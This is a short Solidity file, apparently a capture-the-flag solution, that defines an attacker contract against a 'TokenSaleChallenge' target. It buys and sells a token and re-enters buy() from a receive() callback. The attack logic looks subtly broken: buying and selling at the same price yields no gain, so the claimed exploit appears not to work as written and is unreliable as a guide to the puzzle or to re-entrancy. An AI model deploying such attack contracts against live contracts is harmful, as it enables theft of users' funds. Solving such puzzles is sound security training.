interface ITokenSaleChallenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function isComplete() external view returns (bool);
}

contract ExploitTokenSaleChallenge {
    ITokenSaleChallenge public tokenSale;

    constructor(address _tokenSale) {
        tokenSale = ITokenSaleChallenge(_tokenSale);
    }

    function exploit() public payable {
        tokenSale.buy{value: 1 ether}(1);
        tokenSale.sell(1);
        tokenSale.buy{value: 1 ether}(1);
    }

    receive() external payable {
        if (!tokenSale.isComplete()) {
            uint256 tokensToBuy = msg.value / 1 ether;
            tokenSale.buy{value: msg.value}(tokensToBuy);
        }
    }
}